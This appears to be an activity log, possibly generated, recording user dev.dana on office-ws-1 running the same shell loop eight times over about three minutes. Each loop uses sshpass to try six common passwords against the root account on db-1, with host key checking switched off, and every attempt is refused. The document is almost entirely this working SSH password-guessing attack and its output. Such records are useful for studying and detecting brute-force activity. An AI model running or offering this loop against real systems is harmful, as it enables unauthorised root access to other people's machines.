1. Activity story

The activity runs as `dev.dana` from `office-ws-1`, directed at `db-1`.
It began at 2026-07-27T09:56:05+00:00 and finished at 2026-07-27T09:59:13+00:00.

2. What was executed

Step 1 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:56:05+00:00 to 2026-07-27T09:56:24+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 2 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:56:28+00:00 to 2026-07-27T09:56:48+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 3 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:56:52+00:00 to 2026-07-27T09:57:12+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 4 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:57:16+00:00 to 2026-07-27T09:57:35+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 5 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:57:39+00:00 to 2026-07-27T09:57:59+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 6 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:58:03+00:00 to 2026-07-27T09:58:23+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 7 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:58:27+00:00 to 2026-07-27T09:58:49+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 8 — on `office-ws-1` as `dev.dana`, from 2026-07-27T09:58:53+00:00 to 2026-07-27T09:59:13+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
